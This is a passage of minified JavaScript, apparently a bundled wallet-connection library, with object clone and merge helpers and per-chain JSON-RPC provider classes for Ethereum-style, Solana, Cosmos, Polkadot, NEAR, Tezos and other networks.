r=Object.create(e);return Object.assign(r,t)}return t}function sx(t){return typeof t=="object"&&t!==null}function hO(t){return Object.getOwnPropertySymbols(t).filter(e=>Object.prototype.propertyIsEnumerable.call(t,e))}function fO(t){return t==null?t===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(t)}const wq="[object RegExp]",dO="[object String]",pO="[object Number]",gO="[object Boolean]",yO="[object Arguments]",vq="[object Symbol]",bq="[object Date]",Eq="[object Map]",xq="[object Set]",Sq="[object Array]",_q="[object ArrayBuffer]",Iq="[object Object]",Oq="[object DataView]",$q="[object Uint8Array]",Pq="[object Uint8ClampedArray]",Tq="[object Uint16Array]",Aq="[object Uint32Array]",Cq="[object Int8Array]",Rq="[object Int16Array]",Dq="[object Int32Array]",Nq="[object Float32Array]",kq="[object Float64Array]";function Bq(t,e){return va(t,void 0,t,new Map,e)}function va(t,e,n,r=new Map,i=void 0){const o=i==null?void 0:i(t,e,n,r);if(o!=null)return o;if(yw(t))return t;if(r.has(t))return r.get(t);if(Array.isArray(t)){const l=new Array(t.length);r.set(t,l);for(let c=0;c<t.length;c++)l[c]=va(t[c],c,n,r,i);return Object.hasOwn(t,"index")&&(l.index=t.index),Object.hasOwn(t,"input")&&(l.input=t.input),l}if(t instanceof Date)return new Date(t.getTime());if(t instanceof RegExp){const l=new RegExp(t.source,t.flags);return l.lastIndex=t.lastIndex,l}if(t instanceof Map){const l=new Map;r.set(t,l);for(const[c,u]of t)l.set(c,va(u,c,n,r,i));return l}if(t instanceof Set){const l=new Set;r.set(t,l);for(const c of t)l.add(va(c,void 0,n,r,i));return l}if(typeof Buffer<"u"&&Buffer.isBuffer(t))return t.subarray();if(mw(t)){const l=new(Object.getPrototypeOf(t)).constructor(t.length);r.set(t,l);for(let c=0;c<t.length;c++)l[c]=va(t[c],c,n,r,i);return l}if(t instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&t instanceof SharedArrayBuffer)return t.slice(0);if(t instanceof DataView){const l=new DataView(t.buffer.slice(0),t.byteOffset,t.byteLength);return r.set(t,l),Ys(l,t,n,r,i),l}if(typeof File<"u"&&t instanceof File){const l=new File([t],t.name,{type:t.type});return r.set(t,l),Ys(l,t,n,r,i),l}if(t instanceof Blob){const l=new Blob([t],{type:t.type});return r.set(t,l),Ys(l,t,n,r,i),l}if(t instanceof Error){const l=new t.constructor;return r.set(t,l),l.message=t.message,l.name=t.name,l.stack=t.stack,l.cause=t.cause,Ys(l,t,n,r,i),l}if(typeof t=="object"&&Lq(t)){const l=Object.create(Object.getPrototypeOf(t));return r.set(t,l),Ys(l,t,n,r,i),l}return t}function Ys(t,e,n=t,r,i){const o=[...Object.keys(e),...hO(e)];for(let l=0;l<o.length;l++){const c=o[l],u=Object.getOwnPropertyDescriptor(t,c);(u==null||u.writable)&&(t[c]=va(e[c],c,n,r,i))}}function Lq(t){switch(fO(t)){case yO:case Sq:case _q:case Oq:case gO:case bq:case Nq:case kq:case Cq:case Rq:case Dq:case Eq:case pO:case Iq:case wq:case xq:case dO:case vq:case $q:case Pq:case Tq:case Aq:return!0;default:return!1}}function jq(t,e){return Bq(t,(n,r,i,o)=>{if(typeof t=="object")switch(Object.prototype.toString.call(t)){case pO:case dO:case gO:{const l=new t.constructor(t==null?void 0:t.valueOf());return Ys(l,t),l}case yO:{const l={};return Ys(l,t),l.length=t.length,l[Symbol.iterator]=t[Symbol.iterator],l}default:return}})}function ox(t){return jq(t)}function ax(t){return t!==null&&typeof t=="object"&&fO(t)==="[object Arguments]"}function Uq(t){return mw(t)}function Mq(t){var n;if(typeof t!="object"||t==null)return!1;if(Object.getPrototypeOf(t)===null)return!0;if(Object.prototype.toString.call(t)!=="[object Object]"){const r=t[Symbol.toStringTag];return r==null||!((n=Object.getOwnPropertyDescriptor(t,Symbol.toStringTag))!=null&&n.writable)?!1:t.toString()===`[object ${r}]`}let e=t;for(;Object.getPrototypeOf(e)!==null;)e=Object.getPrototypeOf(e);return Object.getPrototypeOf(t)===e}function Fq(t,...e){const n=e.slice(0,-1),r=e[e.length-1];let i=t;for(let o=0;o<n.length;o++){const l=n[o];i=gm(i,l,r,new Map)}return i}function gm(t,e,n,r){if(yw(t)&&(t=Object(t)),e==null||typeof e!="object")return t;if(r.has(e))return mq(r.get(e));if(r.set(e,t),Array.isArray(e)){e=e.slice();for(let o=0;o<e.length;o++)e[o]=e[o]??void 0}const i=[...Object.keys(e),...hO(e)];for(let o=0;o<i.length;o++){const l=i[o];let c=e[l],u=t[l];if(ax(c)&&(c={...c}),ax(u)&&(u={...u}),typeof Buffer<"u"&&Buffer.isBuffer(c)&&(c=ox(c)),Array.isArray(c))if(typeof u=="object"&&u!=null){const d=[],y=Reflect.ownKeys(u);for(let g=0;g<y.length;g++){const E=y[g];d[E]=u[E]}u=d}else u=[];const f=n(u,c,l,t,e,r);f!=null?t[l]=f:Array.isArray(c)||sx(u)&&sx(c)?t[l]=gm(u,c,n,r):u==null&&Mq(c)?t[l]=gm({},c,n,r):u==null&&Uq(c)?t[l]=ox(c):(u===void 0||c!==void 0)&&(t[l]=c)}return t}function zq(t,...e){return Fq(t,...e,yq)}var qq=Object.defineProperty,Hq=Object.defineProperties,Vq=Object.getOwnPropertyDescriptors,lx=Object.getOwnPropertySymbols,Wq=Object.prototype.hasOwnProperty,Kq=Object.prototype.propertyIsEnumerable,cx=(t,e,n)=>e in t?qq(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Dh=(t,e)=>{for(var n in e||(e={}))Wq.call(e,n)&&cx(t,n,e[n]);if(lx)for(var n of lx(e))Kq.call(e,n)&&cx(t,n,e[n]);return t},Gq=(t,e)=>Hq(t,Vq(e));function nr(t,e,n){var r;const i=FI(t);return((r=e.rpcMap)==null?void 0:r[i.reference])||`${uO}?chainId=${i.namespace}:${i.reference}&projectId=${n}`}function yo(t){return t.includes(":")?t.split(":")[1]:t}function mO(t){return t.map(e=>`${e.split(":")[0]}:${e.split(":")[1]}`)}function Yq(t,e){const n=Object.keys(e.namespaces).filter(i=>i.includes(t));if(!n.length)return[];const r=[];return n.forEach(i=>{const o=e.namespaces[i].accounts;r.push(...o)}),r}function iy(t={},e={}){const n=ux(t),r=ux(e);return zq(n,r)}function ux(t){var e,n,r,i;const o={};if(!Xz(t))return o;for(const[l,c]of Object.entries(t)){const u=gw(l)?[l]:c.chains,f=c.methods||[],d=c.events||[],y=c.rpcMap||{},g=hc(l);o[g]=Gq(Dh(Dh({},o[g]),c),{chains:Kg(u,(e=o[g])==null?void 0:e.chains),methods:Kg(f,(n=o[g])==null?void 0:n.methods),events:Kg(d,(r=o[g])==null?void 0:r.events),rpcMap:Dh(Dh({},y),(i=o[g])==null?void 0:i.rpcMap)})}return o}function hx(t){return t.includes(":")?t.split(":")[2]:t}function fx(t){const e={};for(const[n,r]of Object.entries(t)){const i=r.methods||[],o=r.events||[],l=r.accounts||[],c=gw(n)?[n]:r.chains?r.chains:mO(r.accounts);e[n]={chains:c,methods:i,events:o,accounts:l}}return e}function sy(t){return typeof t=="number"?t:t.includes("0x")?parseInt(t,16):(t=t.includes(":")?t.split(":")[1]:t,isNaN(Number(t))?t:Number(t))}const wO={},Ge=t=>wO[t],oy=(t,e)=>{wO[t]=e};var Jq=Object.defineProperty,Zq=(t,e,n)=>e in t?Jq(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ea=(t,e,n)=>Zq(t,typeof e!="symbol"?e+"":e,n);class Qq{constructor(e){ea(this,"name","polkadot"),ea(this,"client"),ea(this,"httpProviders"),ea(this,"events"),ea(this,"namespace"),ea(this,"chainId"),this.namespace=e.namespace,this.events=Ge("events"),this.client=Ge("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,n){this.httpProviders[e]||this.setHttpProvider(e,n),this.chainId=e,this.events.emit(yr.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(n=>{var r;const i=yo(n);e[i]=this.createHttpProvider(i,(r=this.namespace.rpcMap)==null?void 0:r[n])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,n=this.httpProviders[e];if(typeof n>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return n}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProvider(e,n){const r=n||nr(e,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new gr(new Br(r,Ge("disableProviderPing")))}}var Xq=Object.defineProperty,eH=Object.defineProperties,tH=Object.getOwnPropertyDescriptors,dx=Object.getOwnPropertySymbols,nH=Object.prototype.hasOwnProperty,rH=Object.prototype.propertyIsEnumerable,ym=(t,e,n)=>e in t?Xq(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,px=(t,e)=>{for(var n in e||(e={}))nH.call(e,n)&&ym(t,n,e[n]);if(dx)for(var n of dx(e))rH.call(e,n)&&ym(t,n,e[n]);return t},gx=(t,e)=>eH(t,tH(e)),ta=(t,e,n)=>ym(t,typeof e!="symbol"?e+"":e,n);class iH{constructor(e){ta(this,"name","eip155"),ta(this,"client"),ta(this,"chainId"),ta(this,"namespace"),ta(this,"httpProviders"),ta(this,"events"),this.namespace=e.namespace,this.events=Ge("events"),this.client=Ge("client"),this.httpProviders=this.createHttpProviders(),this.chainId=parseInt(this.getDefaultChain())}async request(e){switch(e.request.method){case"eth_requestAccounts":return this.getAccounts();case"eth_accounts":return this.getAccounts();case"wallet_switchEthereumChain":return await this.handleSwitchChain(e);case"eth_chainId":return parseInt(this.getDefaultChain());case"wallet_getCapabilities":return await this.getCapabilities(e);case"wallet_getCallsStatus":return await this.getCallStatus(e)}return this.namespace.methods.includes(e.request.method)?await this.client.request(e):this.getHttpProvider().request(e.request)}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}setDefaultChain(e,n){this.httpProviders[e]||this.setHttpProvider(parseInt(e),n),this.chainId=parseInt(e),this.events.emit(yr.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId.toString();if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}createHttpProvider(e,n){const r=n||nr(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new gr(new Br(r,Ge("disableProviderPing")))}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProviders(){const e={};return this.namespace.chains.forEach(n=>{var r;const i=parseInt(yo(n));e[i]=this.createHttpProvider(i,(r=this.namespace.rpcMap)==null?void 0:r[n])}),e}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2]))]:[]}getHttpProvider(){const e=this.chainId,n=this.httpProviders[e];if(typeof n>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return n}async handleSwitchChain(e){var n,r;let i=e.request.params?(n=e.request.params[0])==null?void 0:n.chainId:"0x0";i=i.startsWith("0x")?i:`0x${i}`;const o=parseInt(i,16);if(this.isChainApproved(o))this.setDefaultChain(`${o}`);else if(this.namespace.methods.includes("wallet_switchEthereumChain"))await this.client.request({topic:e.topic,request:{method:e.request.method,params:[{chainId:i}]},chainId:(r=this.namespace.chains)==null?void 0:r[0]}),this.setDefaultChain(`${o}`);else throw new Error(`Failed to switch to chain 'eip155:${o}'. The chain is not approved or the wallet does not support 'wallet_switchEthereumChain' method.`);return null}isChainApproved(e){return this.namespace.chains.includes(`${this.name}:${e}`)}async getCapabilities(e){var n,r,i;const o=(r=(n=e.request)==null?void 0:n.params)==null?void 0:r[0];if(!o)throw new Error("Missing address parameter in `wallet_getCapabilities` request");const l=this.client.session.get(e.topic),c=((i=l==null?void 0:l.sessionProperties)==null?void 0:i.capabilities)||{};if(c!=null&&c[o])return c==null?void 0:c[o];const u=await this.client.request(e);try{await this.client.session.update(e.topic,{sessionProperties:gx(px({},l.sessionProperties||{}),{capabilities:gx(px({},c||{}),{[o]:u})})})}catch(f){console.warn("Failed to update session with capabilities",f)}return u}async getCallStatus(e){var n,r;const i=this.client.session.get(e.topic),o=(n=i.sessionProperties)==null?void 0:n.bundler_name;if(o){const c=this.getBundlerUrl(e.chainId,o);try{return await this.getUserOperationReceipt(c,e)}catch(u){console.warn("Failed to fetch call status from bundler",u,c)}}const l=(r=i.sessionProperties)==null?void 0:r.bundler_url;if(l)try{return await this.getUserOperationReceipt(l,e)}catch(c){console.warn("Failed to fetch call status from custom bundler",c,l)}if(this.namespace.methods.includes(e.request.method))return await this.client.request(e);throw new Error("Fetching call status not approved by the wallet.")}async getUserOperationReceipt(e,n){var r;const i=new URL(e),o=await fetch(i,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(ys("eth_getUserOperationReceipt",[(r=n.request.params)==null?void 0:r[0]]))});if(!o.ok)throw new Error(`Failed to fetch user operation receipt - ${o.status}`);return await o.json()}getBundlerUrl(e,n){return`${gq}?projectId=${this.client.core.projectId}&chainId=${e}&bundler=${n}`}}var sH=Object.defineProperty,oH=(t,e,n)=>e in t?sH(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,na=(t,e,n)=>oH(t,typeof e!="symbol"?e+"":e,n);class aH{constructor(e){na(this,"name","solana"),na(this,"client"),na(this,"httpProviders"),na(this,"events"),na(this,"namespace"),na(this,"chainId"),this.namespace=e.namespace,this.events=Ge("events"),this.client=Ge("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,n){this.httpProviders[e]||this.setHttpProvider(e,n),this.chainId=e,this.events.emit(yr.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(n=>{var r;const i=yo(n);e[i]=this.createHttpProvider(i,(r=this.namespace.rpcMap)==null?void 0:r[n])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,n=this.httpProviders[e];if(typeof n>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return n}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProvider(e,n){const r=n||nr(e,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new gr(new Br(r,Ge("disableProviderPing")))}}var lH=Object.defineProperty,cH=(t,e,n)=>e in t?lH(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ra=(t,e,n)=>cH(t,typeof e!="symbol"?e+"":e,n);class uH{constructor(e){ra(this,"name","cosmos"),ra(this,"client"),ra(this,"httpProviders"),ra(this,"events"),ra(this,"namespace"),ra(this,"chainId"),this.namespace=e.namespace,this.events=Ge("events"),this.client=Ge("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,n){this.httpProviders[e]||this.setHttpProvider(e,n),this.chainId=e,this.events.emit(yr.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(n=>{var r;const i=yo(n);e[i]=this.createHttpProvider(i,(r=this.namespace.rpcMap)==null?void 0:r[n])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,n=this.httpProviders[e];if(typeof n>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return n}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProvider(e,n){const r=n||nr(e,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new gr(new Br(r,Ge("disableProviderPing")))}}var hH=Object.defineProperty,fH=(t,e,n)=>e in t?hH(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ia=(t,e,n)=>fH(t,typeof e!="symbol"?e+"":e,n);class dH{constructor(e){ia(this,"name","algorand"),ia(this,"client"),ia(this,"httpProviders"),ia(this,"events"),ia(this,"namespace"),ia(this,"chainId"),this.namespace=e.namespace,this.events=Ge("events"),this.client=Ge("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,n){if(!this.httpProviders[e]){const r=n||nr(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,r)}this.chainId=e,this.events.emit(yr.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(n=>{var r;e[n]=this.createHttpProvider(n,(r=this.namespace.rpcMap)==null?void 0:r[n])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,n=this.httpProviders[e];if(typeof n>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return n}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProvider(e,n){const r=n||nr(e,this.namespace,this.client.core.projectId);return typeof r>"u"?void 0:new gr(new Br(r,Ge("disableProviderPing")))}}var pH=Object.defineProperty,gH=(t,e,n)=>e in t?pH(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,sa=(t,e,n)=>gH(t,typeof e!="symbol"?e+"":e,n);class yH{constructor(e){sa(this,"name","cip34"),sa(this,"client"),sa(this,"httpProviders"),sa(this,"events"),sa(this,"namespace"),sa(this,"chainId"),this.namespace=e.namespace,this.events=Ge("events"),this.client=Ge("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,n){this.httpProviders[e]||this.setHttpProvider(e,n),this.chainId=e,this.events.emit(yr.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(n=>{const r=this.getCardanoRPCUrl(n),i=yo(n);e[i]=this.createHttpProvider(i,r)}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,n=this.httpProviders[e];if(typeof n>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return n}getCardanoRPCUrl(e){const n=this.namespace.rpcMap;if(n)return n[e]}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProvider(e,n){const r=n||this.getCardanoRPCUrl(e);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new gr(new Br(r,Ge("disableProviderPing")))}}var mH=Object.defineProperty,wH=(t,e,n)=>e in t?mH(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,oa=(t,e,n)=>wH(t,typeof e!="symbol"?e+"":e,n);class vH{constructor(e){oa(this,"name","elrond"),oa(this,"client"),oa(this,"httpProviders"),oa(this,"events"),oa(this,"namespace"),oa(this,"chainId"),this.namespace=e.namespace,this.events=Ge("events"),this.client=Ge("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,n){this.httpProviders[e]||this.setHttpProvider(e,n),this.chainId=e,this.events.emit(yr.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(n=>{var r;const i=yo(n);e[i]=this.createHttpProvider(i,(r=this.namespace.rpcMap)==null?void 0:r[n])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,n=this.httpProviders[e];if(typeof n>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return n}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProvider(e,n){const r=n||nr(e,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new gr(new Br(r,Ge("disableProviderPing")))}}var bH=Object.defineProperty,EH=(t,e,n)=>e in t?bH(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,aa=(t,e,n)=>EH(t,typeof e!="symbol"?e+"":e,n);class xH{constructor(e){aa(this,"name","multiversx"),aa(this,"client"),aa(this,"httpProviders"),aa(this,"events"),aa(this,"namespace"),aa(this,"chainId"),this.namespace=e.namespace,this.events=Ge("events"),this.client=Ge("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,n){this.httpProviders[e]||this.setHttpProvider(e,n),this.chainId=e,this.events.emit(yr.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(n=>{var r;const i=yo(n);e[i]=this.createHttpProvider(i,(r=this.namespace.rpcMap)==null?void 0:r[n])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,n=this.httpProviders[e];if(typeof n>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return n}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProvider(e,n){const r=n||nr(e,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new gr(new Br(r,Ge("disableProviderPing")))}}var SH=Object.defineProperty,_H=(t,e,n)=>e in t?SH(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,la=(t,e,n)=>_H(t,typeof e!="symbol"?e+"":e,n);class IH{constructor(e){la(this,"name","near"),la(this,"client"),la(this,"httpProviders"),la(this,"events"),la(this,"namespace"),la(this,"chainId"),this.namespace=e.namespace,this.events=Ge("events"),this.client=Ge("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,n){if(this.chainId=e,!this.httpProviders[e]){const r=n||nr(`${this.name}:${e}`,this.namespace);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,r)}this.events.emit(yr.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(n=>{var r;e[n]=this.createHttpProvider(n,(r=this.namespace.rpcMap)==null?void 0:r[n])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,n=this.httpProviders[e];if(typeof n>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return n}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProvider(e,n){const r=n||nr(e,this.namespace);return typeof r>"u"?void 0:new gr(new Br(r,Ge("disableProviderPing")))}}var OH=Object.defineProperty,$H=(t,e,n)=>e in t?OH(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ca=(t,e,n)=>$H(t,typeof e!="symbol"?e+"":e,n);class PH{constructor(e){ca(this,"name","tezos"),ca(this,"client"),ca(this,"httpProviders"),ca(this,"events"),ca(this,"namespace"),ca(this,"chainId"),this.namespace=e.namespace,this.events=Ge("events"),this.client=Ge("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,n){if(this.chainId=e,!this.httpProviders[e]){const r=n||nr(`${this.name}:${e}`,this.namespace);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,r)}this.events.emit(yr.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(n=>{e[n]=this.createHttpProvider(n)}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,n=this.httpProviders[e];if(typeof n>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return n}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProvider(e,n){const r=n||nr(e,this.namespace);return typeof r>"u"?void 0:new gr(new Br(r))}}var TH=Object.defineProperty,AH=(t,e,n)=>e in t?TH(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ua=(t,e,n)=>AH(t,typeof e!="symbol"?e+"":e,n);class CH{constructor(e){ua(this,"name",ga),ua(this,"client"),ua(this,"httpProviders"),ua(this,"events"),ua(this,"namespace"),ua(this,"chainId"),this.namespace=e.namespace,this.events=Ge("events"),this.client=Ge("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace.chains=[...new Set((this.namespace.chains||[]).concat(e.chains||[]))],this.namespace.accounts=[...new Set((this.namespace.accounts||[]).concat(e.accounts||[]))],this.namespace.methods=[...new Set((this.namespace.methods||[]).concat(e.methods||[]))],this.namespace.events=[...new Set((this.namespace.events||[]).concat(e.events||[]))],this.httpProviders=this.createHttpProviders()}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider(e.chainId).request(e.request)}setDefaultChain(e,n){this.httpProviders[e]||this.setHttpProvider(e,n),this.chainId=e,this.events.emit(yr.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return 